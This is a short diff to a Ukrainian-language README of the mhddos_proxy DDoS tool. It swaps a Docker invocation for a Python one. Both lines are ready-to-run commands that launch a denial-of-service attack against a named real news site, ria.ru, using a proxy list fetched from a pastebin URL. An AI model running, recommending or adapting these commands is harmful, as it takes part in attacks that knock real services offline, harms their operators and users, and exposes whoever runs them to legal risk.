@@ -116,7 +116,7 @@
 
 #### Віддалений файл (однаково для Python та Docker)
 
-    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxies https://pastebin.com/raw/UkFWzLOt https://ria.ru
+    python3 runner.py --proxies https://pastebin.com/raw/UkFWzLOt https://ria.ru
 
 #### Для Python
 
